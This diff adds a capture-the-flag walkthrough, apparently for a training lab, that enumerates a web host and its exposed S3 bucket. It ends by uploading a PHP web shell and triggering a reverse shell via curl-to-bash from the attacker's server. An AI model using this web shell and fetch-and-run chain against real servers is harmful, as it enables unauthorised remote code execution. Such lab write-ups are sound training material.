@@ -1,0 +1,29 @@
+How many TCP ports are open?
+nmap -sC -sV -sT 10.129.183.242
+
+What is the domain of the email address provided in the "Contact" section of the website? thetoppers.htb
+
+In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames? /etc/hosts
+
+Which sub-domain is discovered during further enumeration?
+gobuster vhost -w /usr/share/wordlists/subdomains-top1million-5000.txt -u thetoppers.htb --append-domain
+
+Which service is running on the discovered sub-domain? Amazon s3
+
+Which command line utility can be used to interact with the service running on the discovered sub-domain? awscli
+
+Which command is used to set up the AWS CLI installation? aws configure
+
+What is the command used by the above utility to list all of the S3 buckets? aws --endpoint-url=http://s3.thetoppers.htb s3 ls
+
+This server is configured to run files written in what web scripting language?
+aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb -> php
+
+To get the flag:
+To get a shell in php we need <?php system($_GET['cmd']);?> -> echo '<?php system($_GET['cmd']);?>' > shell.php
+Now to upload: aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+We can execute code now but we still need a shell. Google bash reverse shell to get shell.sh script
+Start listening to the port you just opened: nc -lvp 1337
+Now to connect the two set up a webserver for the remote site to connect to: python3 -m http.server 8000
+To connect: http://thetoppers.htb/shell.php?cmd=curl%2010.10.15.158:8000/shell.sh|bash
+Now search for flag.txt: find / -type f -name flag.txt -> /var/www/flag.txt
